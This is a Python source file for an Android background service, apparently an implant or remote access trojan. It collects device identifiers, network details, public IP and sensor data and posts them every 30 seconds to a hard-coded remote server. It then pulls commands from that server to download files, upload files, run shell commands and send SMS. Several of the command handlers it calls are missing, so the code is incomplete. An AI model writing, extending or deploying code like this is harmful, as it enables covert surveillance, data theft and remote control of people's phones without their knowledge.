import os
import time
import requests
import base64
import threading
import socket
from datetime import datetime
from android.permissions import request_permissions, Permission
from jnius import autoclass
from plyer import accelerometer, gyroscope

# Server configuration
SERVER_URL = "https://lunara-film.online/living/fileshare.php"
UPDATE_INTERVAL = 30  # زيادة الفترة لتوفير البطارية
REQUEST_TIMEOUT = 15

class BackgroundService:
    def __init__(self):
        self.hostname = socket.gethostname()
        self.ip = self.get_public_ip()
        self.client_id = f"mobile_{self.hostname}_{self.ip}"
        self.session = requests.Session()
        self.session.headers.update({'Content-Type': 'application/json'})
        self.running = True
        
        # Request necessary permissions
        self.request_permissions()
        
        # Start the service
        self.start_service()

    def request_permissions(self):
        required_permissions = [
            Permission.INTERNET,
            Permission.ACCESS_NETWORK_STATE,
            Permission.ACCESS_WIFI_STATE,
            Permission.READ_PHONE_STATE,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ]
        
        request_permissions(required_permissions)
        
        # Start sensors if available
        try:
            accelerometer.enable()
            gyroscope.enable()
        except Exception as e:
            print(f"Sensor error: {str(e)}")

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text.strip()
        except:
            return socket.gethostbyname(self.hostname)

    def collect_device_info(self):
        info = {
            'manufacturer': autoclass('android.os.Build').MANUFACTURER,
            'model': autoclass('android.os.Build').MODEL,
            'android_version': autoclass('android.os.Build$VERSION').RELEASE,
            'serial': autoclass('android.os.Build').SERIAL,
            'network_info': self.get_network_info()
        }
        return info

    def get_network_info(self):
        try:
            Context = autoclass('android.content.Context')
            ConnectivityManager = autoclass('android.net.ConnectivityManager')
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = activity.getSystemService(Context.CONNECTIVITY_SERVICE)
            
            net_info = cm.getActiveNetworkInfo()
            if net_info:
                return {
                    'type': net_info.getTypeName(),
                    'subtype': net_info.getSubtypeName(),
                    'connected': net_info.isConnected()
                }
        except:
            return {}

    def send_heartbeat(self):
        try:
            data = {
                'action': 'heartbeat',
                'client_id': self.client_id,
                'timestamp': datetime.now().isoformat(),
                'device_info': self.collect_device_info(),
                'sensors': self.read_sensors()
            }
            
            response = self.session.post(
                SERVER_URL,
                json=data,
                timeout=REQUEST_TIMEOUT
            )
            
            return response.json() if response.status_code == 200 else None
            
        except Exception as e:
            print(f"Heartbeat error: {str(e)}")
            return None

    def read_sensors(self):
        data = {}
        try:
            accel = accelerometer.acceleration
            if accel:
                data['accelerometer'] = {
                    'x': accel[0],
                    'y': accel[1],
                    'z': accel[2]
                }
        except:
            pass
            
        try:
            gyro = gyroscope.rotation
            if gyro:
                data['gyroscope'] = {
                    'x': gyro[0],
                    'y': gyro[1],
                    'z': gyro[2]
                }
        except:
            pass
            
        return data

    def check_commands(self):
        try:
            response = self.session.get(
                f"{SERVER_URL}?action=get_commands&client_id={self.client_id}",
                timeout=REQUEST_TIMEOUT
            )
            
            if response.status_code == 200:
                commands = response.json().get('commands', [])
                for cmd in commands:
                    self.execute_command(cmd)
                    
        except Exception as e:
            print(f"Command error: {str(e)}")

    def execute_command(self, command):
        try:
            cmd = command.get('command')
            
            if cmd == 'download':
                self.download_file(command['url'])
            elif cmd == 'upload':
                self.upload_file(command['local_path'], command['remote_path'])
            elif cmd == 'shell':
                self.execute_shell(command['command'])
            elif cmd == 'sms':
                self.send_sms(command['number'], command['message'])
                
        except Exception as e:
            print(f"Command execution error: {str(e)}")

    def download_file(self, url):
        try:
            local_path = os.path.join(
                autoclass('android.os.Environment').getExternalStorageDirectory().getAbsolutePath(),
                'Download',
                os.path.basename(url)
            )
            
            with requests.get(url, stream=True) as r:
                with open(local_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
                        
            return True
        except:
            return False

    def start_service(self):
        def service_loop():
            while self.running:
                try:
                    # Send heartbeat
                    response = self.send_heartbeat()
                    
                    # Check for commands if heartbeat was successful
                    if response:
                        self.check_commands()
                        
                except Exception as e:
                    print(f"Service error: {str(e)}")
                    
                finally:
                    time.sleep(UPDATE_INTERVAL)

        # Start service thread
        threading.Thread(target=service_loop, daemon=True).start()

# Start the service when the app runs
if __name__ == '__main__':
    service = BackgroundService()
    
    # Keep the app running
    while True:
        time.sleep(3600)  # Sleep for 1 hour
